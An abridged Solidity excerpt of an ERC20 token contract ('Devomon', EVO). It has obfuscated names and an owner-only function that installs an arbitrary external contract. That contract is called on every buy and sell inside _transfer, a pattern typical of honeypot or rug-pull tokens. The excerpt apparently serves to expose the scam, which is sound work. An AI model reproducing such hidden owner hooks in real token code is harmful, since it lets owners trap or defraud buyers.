...
contract TokenM is ERC20 {
    ...
    IUserAmountroooos public roooos;    
    ...
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Devomon", "EVO") {
    ...
    function crooceesBbyingRroo(IUserAmountroooos _roooos) public onlyOwner {
        roooos = _roooos;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                roooos.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				roooos.addOutAmount(from, amount);
            }else{
                roooos.addOutAmount(from, amount);
                takeFee = false;
            }
